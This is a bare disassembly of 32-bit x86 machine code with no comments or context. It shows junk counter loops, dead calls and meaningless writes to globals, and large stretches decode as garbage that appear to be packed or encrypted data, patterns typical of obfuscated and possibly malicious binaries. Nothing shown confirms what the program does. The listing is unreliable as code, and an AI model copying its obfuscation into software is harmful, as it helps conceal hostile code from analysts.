  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0xf612b55
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	mov    ds:0xdab88e49,eax
  409493:	push   ecx
  409494:	dec    esi
  409495:	je     0x4094e3
  409497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409498:	lahf   
  409499:	test   DWORD PTR [eax+0x6f],ecx
  40949c:	(bad)  
  40949d:	xor    edi,ebp
  40949f:	mov    cl,0x45
  4094a1:	mov    edi,0x7e6f0e30
  4094a6:	ret    
  4094a7:	xor    DWORD PTR [ebx],ecx
  4094a9:	jb     0x4094c6
  4094ab:	and    esi,DWORD PTR [edx+esi*2+0x14c7f3d9]
  4094b2:	add    cl,ch
  4094b4:	inc    esi
  4094b5:	pop    esi
  4094b6:	out    dx,al
  4094b7:	es repz adc al,ch
  4094bb:	daa    
  4094bc:	mov    edi,0xaffe23f9
  4094c1:	push   ds
  4094c2:	push   es
  4094c3:	inc    esi
  4094c4:	pop    edi
  4094c5:	jle    0x4094f2
  4094c7:	adc    BYTE PTR ds:0x502e4dc7,cl
  4094cd:	push   edi
  4094ce:	imul   ebp,DWORD PTR [di+0x3aa0],0xbcf50562
  4094d7:	outs   dx,DWORD PTR ds:[esi]
  4094d8:	mov    dl,0x6b
  4094da:	clc    
  4094db:	clc    
  4094dc:	dec    eax
  4094dd:	sbb    esp,DWORD PTR [esi-0x69]
  4094e0:	jns    0x40954e
  4094e2:	lds    esi,FWORD PTR [esi+0x6]
  4094e5:	jno    0x4094eb
  4094e7:	leave  
  4094e8:	loop   0x40955c
  4094ea:	fisttp QWORD PTR [edi]
  4094ec:	in     al,0xf3
  4094ee:	sub    ebp,DWORD PTR [ebp-0x3c]
  4094f1:	xchg   ebx,eax
  4094f2:	cmp    dh,BYTE PTR [edi-0x1f]
  4094f5:	sahf   
  4094f6:	xor    DWORD PTR [eax+ebx*1-0x4cd9d839],0x75bae420
  409501:	mov    cl,0x4a
  409503:	fild   QWORD PTR [ebx+edi*4]
  409506:	scas   eax,DWORD PTR es:[edi]
  409507:	mov    edi,0xd2579866
  40950c:	test   al,0xcb
  40950e:	jmp    0x4ce43b22
  409513:	pushf  
  409514:	adc    ebp,DWORD PTR [ecx]
  409516:	enter  0x1e21,0x2e
  40951a:	mov    ebx,DWORD PTR ds:0x94cb708a
  409520:	leave  
  409521:	mov    DWORD PTR [ebx+0x46891075],ecx
  409527:	adc    BYTE PTR [ebx+0x8458bc0],cl
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    dl,BYTE PTR [ebx+0x21]
  409540:	adc    esi,DWORD PTR [eax+0x7e7e2109]
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	sub    al,0x69
  40954c:	mov    bl,0xdf
  40954e:	mov    esp,0xca6e92bd
  409553:	shld   DWORD PTR [edi-0x15],esi,cl
  409557:	fbld   TBYTE PTR [ebp+0x51]
  40955a:	inc    edi
  40955b:	icebp  
  40955c:	je     0x40957c
  40955e:	imul   ebp,DWORD PTR [ebp+0x51f48fb4],0xbc5fa38c
  409568:	shl    ah,cl
  40956a:	stos   DWORD PTR es:[edi],eax
  40956b:	pop    esi
  40956c:	cmp    ch,BYTE PTR [ecx+0x35f29bca]
  409572:	aaa    
  409573:	frstor [ebx+edx*8-0x35]
  409577:	adc    eax,0x9d6f18f5
  40957c:	add    esp,esp
  40957e:	lock aas 
  409580:	and    ebx,ebx
  409582:	outs   dx,DWORD PTR ds:[esi]
  409583:	fidiv  DWORD PTR [edi+eax*8]
  409586:	mov    ss,edi
  409588:	mov    cl,0x57
  40958a:	mov    ds:0x66a9b4bf,al
  40958f:	mov    cl,0x52
  409591:	rcl    DWORD PTR [eax],0xfc
  409594:	mov    al,0x15
  409596:	xor    esi,DWORD PTR [ebp-0x2d]
  409599:	das    
  40959a:	xchg   ecx,eax
  40959b:	mov    ecx,0xece7e22e
  4095a0:	mov    al,ds:0x7461d3d3
  4095a5:	dec    esi
  4095a6:	pop    esi
  4095a7:	cmp    bl,BYTE PTR [ebp*8+0x478dea20]
  4095ae:	add    eax,0x20583095
  4095b3:	cmp    esp,DWORD PTR [ecx+0x27b9c1e1]
  4095b9:	or     DWORD PTR [ebx-0x7a12871e],ebx
  4095bf:	sbb    eax,0xa2a37199
  4095c4:	daa    
  4095c5:	push   cs
  4095c6:	std    
  4095c7:	and    al,0x8d
  4095c9:	inc    edi
  4095ca:	add    eax,0x94e67175
  4095cf:	movntq (bad),mm0
  4095d0:	out    0xc6,eax
  4095d2:	xchg   DWORD PTR [esi-0x5e],edi
  4095d5:	inc    ebp
  4095d6:	in     eax,0x56
  4095d8:	mov    ch,0x7b
  4095da:	or     BYTE PTR [esi],dl
  4095dc:	fcom   st(7)
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    ecx,DWORD PTR [ecx]
  40961c:	mov    WORD PTR [ecx+eiz*4],es
  40961f:	popf   
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x4095aa
  409628:	shl    BYTE PTR [ebp+0x481d943f],cl
  40962e:	jbe    0x4095fb
  409630:	dec    ebx
  409631:	mov    DWORD PTR [esi],ebp
  409633:	stos   BYTE PTR es:[edi],al
  409634:	adc    ebx,DWORD PTR [eax+0x4d841524]
  40963a:	js     0x40963b
  40963c:	nop
  40963d:	sub    ebx,DWORD PTR [ecx+ecx*4-0xd]
  409641:	lahf   
  409642:	retf   0x351c
  409645:	or     edx,DWORD PTR ds:0xeac4f941
  40964b:	xchg   BYTE PTR ds:0x7157827f,bh
  409651:	sub    eax,0xab113ff1
  409656:	out    dx,eax
  409657:	and    BYTE PTR [eax+0x476a3053],0x95
  40965e:	lahf   
  40965f:	cld    
  409660:	ror    BYTE PTR [ebp+0x4c],cl
  409663:	stos   BYTE PTR es:[edi],al
  409664:	adc    DWORD PTR [esi+0x5d],esi
  409667:	arpl   WORD PTR [edx-0x7d],di
  40966a:	loope  0x40969d
  40966c:	int    0x91
  40966e:	xor    al,0x84
  409670:	imul   eax,esi,0x8d9c589b
  409676:	jns    0x40966e
  409678:	pop    edx
  409679:	out    dx,eax
  40967a:	xchg   esi,eax
  40967b:	adc    al,0x84
  40967d:	loope  0x4096ab
  40967f:	sbb    BYTE PTR [eax-0x520e5e94],ah
  409685:	pop    ecx
  409686:	mov    ah,0x20
  409688:	or     al,0x50
  40968a:	cmc    
  40968b:	(bad)  
  40968c:	mov    esp,0xb0030ccf
  409691:	cmp    BYTE PTR [ebx+0x4e4e85ca],0x86
  409698:	enter  0x1d10,0xfd
  40969c:	mov    ch,dl
  40969e:	adc    esi,DWORD PTR [ebp-0x392858b3]
  4096a4:	in     eax,dx
  4096a5:	or     dl,ah
  4096a7:	ror    BYTE PTR [edi+ecx*4+0x5e6e1fd9],0x98
  4096af:	or     dh,BYTE PTR [edi-0x655c6383]
  4096b5:	or     BYTE PTR [eax+edi*1],ch
  4096b8:	add    al,0x13
  4096ba:	sub    al,0x95
  4096bc:	cwde   
  4096bd:	retf   0xc75c
  4096c0:	mov    ds:0x2bf26fb7,eax
  4096c5:	(bad)  
  4096c6:	xchg   edi,eax
  4096c7:	iret   
  4096c8:	sub    DWORD PTR [eax+ecx*2-0x531d63ff],edx
  4096cf:	popa   
  4096d0:	scas   al,BYTE PTR es:[edi]
  4096d1:	sbb    esi,DWORD PTR [ecx-0x2a]
  4096d4:	fsubr  QWORD PTR [edx+0x148eaab3]
  4096da:	inc    eax
  4096db:	sbb    esp,ebx
  4096dd:	add    DWORD PTR [ecx+0x3a5602da],edi
  4096e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096e4:	add    al,0xf3
  4096e6:	je     0x409755
  4096e8:	jecxz  0x40969b
  4096ea:	sub    ah,bl
  4096ec:	jmp    0x4096a6
  4096ee:	test   eax,0xad708be7
  4096f3:	push   edi
  4096f4:	xor    eax,DWORD PTR [ecx+0x4a]
  4096f7:	mov    ah,0x47
  4096f9:	lock fs sub eax,0x2284d6ff
  409700:	stos   DWORD PTR es:[edi],eax
  409701:	pop    eax
  409702:	ret    0xf50
  409705:	push   ebp
  409706:	mov    ds:0x575a3740,al
  40970b:	mov    ?,WORD PTR [eax]
  40970d:	fst    DWORD PTR [ebp+esi*1-0x45]
  409711:	pushf  
  409712:	lods   eax,DWORD PTR ds:[esi]
  409713:	out    dx,eax
  409714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409715:	adc    eax,0x9432c8f6
  40971a:	mov    ds:0x4fbc807a,eax
  40971f:	nop
  409720:	cmc    
  409721:	xor    BYTE PTR [ecx],cl
  409723:	mov    esi,0xf4eca59a
  409728:	mov    eax,ds:0x8dd76012
  40972d:	cmp    cl,BYTE PTR [edx-0x24]
  409730:	xchg   ebx,eax
  409731:	fisttp WORD PTR [ebp+0x1a6bbe7b]
  409737:	out    dx,al
  409738:	repnz adc eax,0x66766f6d
  40973e:	xchg   ebx,eax
  40973f:	(bad)  
  409740:	scas   al,BYTE PTR es:[edi]
  409741:	inc    esi
  409742:	xchg   ebp,eax
  409743:	push   0x44
  409745:	and    ebx,eax
  409747:	push   ecx
  409748:	xor    ebx,DWORD PTR [ecx-0x235b6902]
  40974e:	push   ebp
  40974f:	push   ecx
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4235bf,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4235db,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4235cb
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	fwait
  4097c0:	mov    dl,0x3
  4097c2:	mov    al,0xb5
  4097c4:	es jle 0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x40980b
  4097cc:	xchg   ebp,eax
  4097cd:	fmul   QWORD PTR ds:0x189fb0f1
  4097d3:	cmp    ebp,DWORD PTR [ebp+0x31]
  4097d6:	and    edx,DWORD PTR [esi+ecx*4]
  4097d9:	sbb    al,0xf3
  4097db:	test   al,0xe6
  4097dd:	iret   
  4097de:	mov    al,ds:0x4ff7e948
  4097e3:	mov    BYTE PTR [ebx-0x5053c987],0x1c
  4097ea:	or     ebp,esp
  4097ec:	add    cl,BYTE PTR [ebx-0x249ea6c0]
  4097f2:	pop    esi
  4097f3:	sbb    eax,esi
  4097f5:	and    dh,bh
  4097f7:	sar    dl,1
  4097f9:	mov    esi,0x523c6c7c
  4097fe:	jne    0x40984d
  409800:	cld    
  409801:	aas    
  409802:	leave  
  409803:	loop   0x40983b
  409805:	pop    ebp
  409806:	mov    bh,0x3
  409808:	mov    esp,0xbfa8b071
  40980d:	(bad)  
  40980e:	neg    DWORD PTR [edi-0x3a8e63a3]
  409814:	dec    ebx
  409815:	push   es
  409816:	cdq    
  409817:	jl     0x40987a
  409819:	cmp    ch,BYTE PTR [ebp+esi*4+0x6b]
  40981d:	jle    0x409893
  40981f:	pop    ebx
  409820:	and    eax,0xbec2b1b3
  409825:	std    
  409826:	lods   al,BYTE PTR ds:[esi]
  409827:	ret    0xcfd5
  40982a:	dec    esi
  40982b:	cmp    bl,BYTE PTR [eax+edi*4]
  40982e:	cmp    edx,DWORD PTR [esi+0x2a57b59d]
  409834:	adc    dh,bh
  409836:	loop   0x40989f
  409838:	rcl    DWORD PTR [ebp+0x43],cl
  40983b:	mov    bl,0x3
  40983d:	adc    DWORD PTR [ebx+esi*1-0x2d],0x2f
  409842:	mov    al,ds:0xcafeb50
  409847:	in     eax,dx
  409848:	jbe    0x4097d6
  40984a:	mov    gs,WORD PTR [esp+ecx*4-0x35f41411]
  409851:	fist   DWORD PTR [ebx]
  409853:	sub    DWORD PTR [edi-0x37],esp
  409856:	push   eax
  409857:	and    BYTE PTR [edi-0x2b33166f],bh
  40985d:	push   ecx
  40985e:	mov    ecx,0x1e8fccbc
  409863:	lods   al,BYTE PTR ds:[esi]
  409864:	enter  0xa381,0x71
  409868:	push   0x263cf2f1
  40986d:	popa   
  40986e:	xchg   esi,eax
  40986f:	cld    
  409870:	add    esi,esi
  409872:	lods   al,BYTE PTR ds:[esi]
  409873:	ins    DWORD PTR es:[edi],dx
  409874:	mov    dx,0x524
  409878:	jecxz  0x40980d
  40987a:	nop
  40987b:	cmp    al,0xad
  40987d:	mov    esi,0x221a21e5
  409882:	pop    esi
  409883:	pop    ebp
  409884:	mov    dl,0x7c
  409886:	fwait
  409887:	mov    al,ds:0xfd75b327
  40988c:	sub    DWORD PTR [edi-0x386c2943],edx
  409892:	adc    al,0x0
  409894:	xor    cl,bl
  409896:	xchg   esi,eax
  409897:	std    
  409898:	imul   esi,ebx,0xa104c2bb
  40989e:	jmp    0x7df054a4
  4098a3:	test   eax,0x6b9b497c
  4098a8:	adc    esp,DWORD PTR [esi+0x41]
  4098ab:	push   esi
  4098ac:	add    BYTE PTR [ebx],dh
  4098ae:	(bad)  
  4098af:	es and bh,ch
  4098b2:	pop    ecx
  4098b4:	sbb    edi,DWORD PTR [esi]
  4098b6:	jl     0x4098bd
  4098b8:	ret    0xd10b
  4098bb:	mov    dh,0xc8
  4098bd:	popa   
  4098be:	retf   
  4098bf:	push   esp
  4098c0:	out    dx,eax
  4098c1:	loope  0x4098ce
  4098c3:	test   al,0x36
  4098c5:	icebp  
  4098c6:	jno    0x409936
  4098c8:	in     eax,0x8
  4098ca:	inc    esp
  4098cb:	int    0xf5
  4098cd:	mov    BYTE PTR fs:[edi-0x58],dh
  4098d1:	jo     0x409856
  4098d3:	mov    ecx,ss
  4098d5:	push   edi
  4098d6:	add    edx,edi
  4098d8:	dec    edx
  4098d9:	mov    BYTE PTR [ecx+0x11],cl
  4098dc:	out    0xe9,eax
  4098de:	shl    DWORD PTR [ecx+0x6d446977],0x64
  4098e5:	aam    0xb2
  4098e7:	shl    BYTE PTR ds:0x87c52427,cl
  4098ed:	sub    eax,0x96f13ee
  4098f2:	mov    ecx,DWORD PTR [ebx+0x25811445]
  4098f8:	and    eax,DWORD PTR fs:[ecx+0x0]
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0x86ec4a4c
  409977:	popf   
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x409939
  409981:	lods   al,BYTE PTR ds:[esi]
  409982:	fdivp  st(0),st
  409984:	in     eax,dx
  409985:	sub    al,0x61
  409987:	xor    ecx,DWORD PTR [eax+0x6f2bb500]
  40998d:	(bad)  
  40998e:	xchg   edx,eax
  40998f:	adc    al,0xad
  409991:	shr    BYTE PTR [esi+0x3715a01b],cl
  409997:	and    al,0x11
  409999:	(bad)  
  40999a:	ds ins BYTE PTR es:[edi],dx
  40999c:	sub    dh,ch
  40999e:	nop
  40999f:	mov    ecx,DWORD PTR [edx+ebp*8+0x3e26d79]
  4099a6:	outs   dx,BYTE PTR ds:[esi]
  4099a7:	or     ch,cl
  4099a9:	dec    ebx
  4099aa:	test   BYTE PTR [ecx],bh
  4099ac:	imul   ebx,edx,0x3
  4099af:	dec    esi
  4099b0:	enter  0x6358,0xd0
  4099b4:	sub    al,0x46
  4099b6:	mov    ss,WORD PTR [esi-0x36]
  4099b9:	xchg   DWORD PTR [ecx+0x1b],ecx
  4099bc:	loop   0x4099cc
  4099be:	and    esp,DWORD PTR [eax-0x7b]
  4099c1:	ins    DWORD PTR es:[edi],dx
  4099c2:	mov    eax,ds:0x6b3154ad
  4099c7:	stos   DWORD PTR es:[edi],eax
  4099c8:	cdq    
  4099c9:	loop   0x409a17
  4099cb:	jb     0x4099ca
  4099cd:	mov    edi,0x425d5604
  4099d2:	push   esi
  4099d3:	popa   
  4099d4:	int    0xfc
  4099d6:	cld    
  4099d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099d8:	push   ds
  4099d9:	mov    ds:0xf56c7de8,al
  4099de:	retf   
  4099df:	addr16 pop edi
  4099e1:	and    bl,BYTE PTR [esp+ebp*2]
  4099e4:	mov    esi,0x2fe6e52b
  4099e9:	mov    edi,0xc479a802
  4099ee:	jecxz  0x409a38
  4099f0:	mov    ecx,0xc165787
  4099f5:	mov    ebp,0xd53fd39b
  4099fa:	jp     0x4099af
  4099fc:	push   esi
  4099fd:	fldenv [ebx-0x32f1433b]
  409a03:	add    BYTE PTR [edx+0x6d],dh
  409a06:	scas   al,BYTE PTR es:[edi]
  409a07:	inc    edi
  409a08:	dec    ecx
  409a09:	or     BYTE PTR [esi+0x64442d3f],0xac
  409a10:	jmp    0xb199:0x72fedb26
  409a17:	popf   
  409a18:	sub    BYTE PTR [esi],bl
  409a1a:	cmp    DWORD PTR ss:[ecx+ecx*1+0x32],esi
  409a1f:	dec    ebp
  409a20:	jno    0x409a50
  409a22:	pop    ecx
  409a23:	cmp    eax,0xe2463
  409a28:	mov    al,ds:0xaf0b08b2
  409a2d:	sub    esi,0xffffffeb
  409a30:	in     eax,0x27
  409a32:	cdq    
  409a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a34:	ins    BYTE PTR es:[edi],dx
  409a35:	xor    ch,BYTE PTR [ebx-0x53275a52]
  409a3b:	inc    esp
  409a3c:	(bad)
  409a3f:	test   eax,0xca164099
  409a44:	dec    ebx
  409a45:	xor    al,0x16
  409a47:	mov    ecx,ebx
  409a49:	inc    eax
  409a4a:	adc    BYTE PTR [ebp+ecx*2-0x42],cl
  409a4e:	mov    ecx,ds
  409a50:	in     al,0xa6
  409a52:	test   eax,0x5bb3832e
  409a57:	cdq    
  409a58:	repz hlt 
  409a5a:	mov    ebp,0x2a3d4a3e
  409a5f:	xlat   BYTE PTR ds:[ebx]
  409a60:	adc    eax,0x6c948caf
  409a65:	outs   dx,BYTE PTR ds:[esi]
  409a66:	out    0x4,al
  409a68:	(bad)  
  409a69:	jbe    0x4099f2
  409a6b:	in     eax,dx
  409a6c:	call   0xe64f:0x917a82d1
  409a73:	xor    edi,DWORD PTR [ebx+0x6ba78e63]
  409a79:	fsub   QWORD PTR [ebp+0x2b420c11]
  409a7f:	fisubr WORD PTR [esi+eiz*1-0x78]
  409a83:	jmp    0x384e:0xa1a866cb
  409a8a:	into   
  409a8b:	xchg   DWORD PTR [edx-0x37],edx
  409a8e:	int    0x90
  409a90:	sub    al,0xcc
  409a92:	and    DWORD PTR [ebx],ebx
  409a94:	fwait
  409a95:	aaa    
  409a96:	loopne 0x409a6f
  409a98:	dec    eax
  409a99:	fnstcw WORD PTR [edi]
  409a9b:	jae    0x409adb
  409a9d:	mov    bh,0x8
  409a9f:	ja     0x409aba
  409aa1:	adc    ah,dl
  409aa3:	div    DWORD PTR [eax+0x1d]
  409aa6:	inc    ebp
  409aa7:	(bad)  
  409aa8:	mov    DWORD PTR [edx+0x8],eax
  409aab:	mov    eax,DWORD PTR [ebp+0x1c]
  409aae:	mov    edx,DWORD PTR [ebp+0x10]
  409ab1:	mov    DWORD PTR [edx+0xc],eax
  409ab4:	mov    eax,DWORD PTR [ebp+0x20]
  409ab7:	mov    edx,DWORD PTR [ebp+0x10]
  409aba:	mov    DWORD PTR [edx+0x10],eax
  409abd:	mov    eax,eax
  409abf:	mov    eax,DWORD PTR [ebp+0x14]
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4235c7
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4235d3,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4235d3,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4235c3
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4235d3,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4235c3,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4235bf
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
